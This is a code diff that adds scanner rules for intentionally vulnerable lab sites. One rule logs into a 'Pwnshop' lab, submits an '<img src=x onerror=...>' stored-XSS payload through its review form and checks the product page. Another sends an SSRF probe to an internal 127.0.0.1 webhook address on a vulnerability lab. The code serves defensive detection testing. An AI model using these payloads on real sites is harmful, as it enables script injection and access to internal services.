@@ -27902,6 +27902,24 @@ const clientSidePwnshopSstiOracle: Rule = async (ctx) =>
     "Pwnshop /seller/preview?template= passes raw query input to ejs.render() — SSTI (PWN-040)"
   );
 
+const PWNSHOP_REVIEW_XSS_MARKERS: { label: string; re: RegExp }[] = [
+  { label: "PWN-011 registry ID", re: /PWN-011/i },
+  { label: "POST /review endpoint", re: /POST \/review\b/i },
+  {
+    label: "EJS unescaped review output",
+    re: /unescaped\s+<code>&lt;%-&gt;<\/code>|&lt;%-\s*(?:review|comment)/i
+  },
+  { label: "Stored XSS product reviews title", re: /Stored XSS[\s\S]{0,80}Product Reviews/i }
+];
+
+const clientSidePwnshopReviewXssOracle: Rule = async (ctx) =>
+  pwnshopRouteOracle(
+    ctx,
+    /\/product\/\d+/i,
+    PWNSHOP_REVIEW_XSS_MARKERS,
+    "Pwnshop POST /review stores comments without sanitization and renders via EJS <%- %> on product pages — stored XSS (PWN-011)"
+  );
+
 const clientSidePwnshopPathTraversalOracle: Rule = async (ctx) =>
   pwnshopRouteOracle(
     ctx,
@@ -28466,6 +28484,65 @@ const pwnshopMailInboxIdorLiveOracle: Rule = async (ctx) => {
       idorUrl,
       victimOtpSnippet: otpMatch[0].slice(0, 80),
       note: "Pwnshop GET /mail/<inbox_token> returns another user's OTP mail without ownership check — PwnMail inbox IDOR (PWN-004)"
+    }
+  };
+};
+
+const pwnshopProductReviewStoredXssLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  const cookie = await pwnshopCompleteOtpSession(ctx);
+  if (!cookie) return NEGATIVE;
+  const canary = `thugirReview${Date.now().toString(36)}`;
+  const xssPayload = `<img src=x onerror="${canary}">`;
+  const reviewUrl = new URL("/review", ctx.origin).toString();
+  const reviewDoc = await ctx.probe.get(reviewUrl, {
+    method: "POST",
+    body: `product_id=1&rating=5&comment=${encodeURIComponent(xssPayload)}`,
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded",
+      Cookie: cookie
+    },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (reviewDoc.status < 200 || reviewDoc.status >= 400) return NEGATIVE;
+  const productUrl = new URL("/product/1", ctx.origin).toString();
+  const productDoc = await ctx.probe.get(productUrl, {
+    maxBytes: 32768,
+    timeoutMs: 15000,
+    headers: { Cookie: cookie }
+  });
+  if (productDoc.status < 200 || productDoc.status >= 400) return NEGATIVE;
+  const onerrorRe = new RegExp(`onerror\\s*=\\s*["'][^"']*${canary}`, "i");
+  if (!onerrorRe.test(productDoc.body) && !productDoc.body.includes(canary)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      reviewUrl,
+      productUrl,
+      canary,
+      snippet:
+        productDoc.body.match(onerrorRe)?.[0]?.slice(0, 160) ??
+        productDoc.body.match(new RegExp(`.{0,60}${canary}.{0,40}`, "i"))?.[0]?.slice(0, 160),
+      note: "Pwnshop POST /review stores comment HTML without sanitization and renders via EJS <%- %> on /product/:id — stored XSS via product reviews (PWN-011)"
+    }
+  };
+};
+
+const pwnshopProductReviewStoredXssRouteLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/product\/\d+/i.test(pageUrl)) return NEGATIVE;
+  const result = await pwnshopProductReviewStoredXssLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Pwnshop /product/:id route scan — POST /review stores unsanitized HTML rendered via EJS <%- %> on product pages — stored XSS via product reviews (PWN-011)"
     }
   };
 };
@@ -49985,6 +50062,43 @@ const ssrfVulnlabBlindLiveOracle: Rule = async (ctx) => {
   };
 };
 
+const ssrfVulnlabWebhookLiveOracle: Rule = async (ctx) => {
+  if (!isSsrfVulnlabHost(ctx)) return NEGATIVE;
+  const origin = ssrfVulnlabProbeOrigin(ctx);
+  const probeUrl = new URL("/webhook/", origin);
+  probeUrl.searchParams.set("url", "http://127.0.0.1:8089/webhook-callback");
+  const doc = await ssrfVulnlabFetchDoc(probeUrl.toString(), { maxBytes: 16384, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const body = ssrfVulnlabLabBody(doc.body);
+  if (!body) return NEGATIVE;
+  const webhookOk =
+    /status:\s*200/i.test(body) &&
+    /X-Internal-Flag:\s*VULNLAB\{ssrf-webhook-leaked-via-headers\}/i.test(body);
+  if (!webhookOk) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      url: probeUrl.toString(),
+      snippet: body.match(/X-Internal-Flag:[^\n]+/i)?.[0]?.slice(0, 160) ?? body.slice(0, 200).trim(),
+      note: "ssrf.vulnlab.dev GET /webhook/?url= POSTs to internal http://127.0.0.1:8089/webhook-callback and leaks X-Internal-Flag in echoed response headers — semi-blind webhook SSRF oracle"
+    }
+  };
+};
+
+const ssrfVulnlabWebhookRouteLiveOracle: Rule = async (ctx) => {
+  if (!isSsrfVulnlabHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/webhook\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await ssrfVulnlabWebhookLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: { ...result.evidence, scannedUrl: pageUrl }
+  };
+};
+
 const ssrfVulnlabBlindRouteLiveOracle: Rule = async (ctx) => {
   if (!isSsrfVulnlabHost(ctx)) return NEGATIVE;
   const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
@@ -60442,6 +60556,7 @@ export const RULES: Record<string, Rule> = {
   clientSideRestVulnwebEvidence,
   clientSidePwnshopEvidence,
   clientSidePwnshopSstiOracle,
+  clientSidePwnshopReviewXssOracle,
   clientSidePwnshopPathTraversalOracle,
   clientSidePwnshopPrototypePollutionOracle,
   pwnshopDebugInfoLiveOracle,
@@ -60458,6 +60573,8 @@ export const RULES: Record<string, Rule> = {
   pwnshopVerifyOtpBruteforceLiveOracle,
   pwnshopMailInboxIdorLiveOracle,
   pwnshopMailIdorRouteLiveOracle,
+  pwnshopProductReviewStoredXssLiveOracle,
+  pwnshopProductReviewStoredXssRouteLiveOracle,
   pwnshopAvatarSvgXssLiveOracle,
   pwnshopApplyCouponLiveOracle,
   pwnshopCouponCategoryBypassLiveOracle,
@@ -60727,6 +60844,8 @@ export const RULES: Record<string, Rule> = {
   ssrfVulnlabParserRouteLiveOracle,
   ssrfVulnlabBlindLiveOracle,
   ssrfVulnlabBlindRouteLiveOracle,
+  ssrfVulnlabWebhookLiveOracle,
+  ssrfVulnlabWebhookRouteLiveOracle,
   sqliVulnlabErrorLiveOracle,
   sqliVulnlabErrorRouteLiveOracle,
   sqliVulnlabSecondOrderLiveOracle,
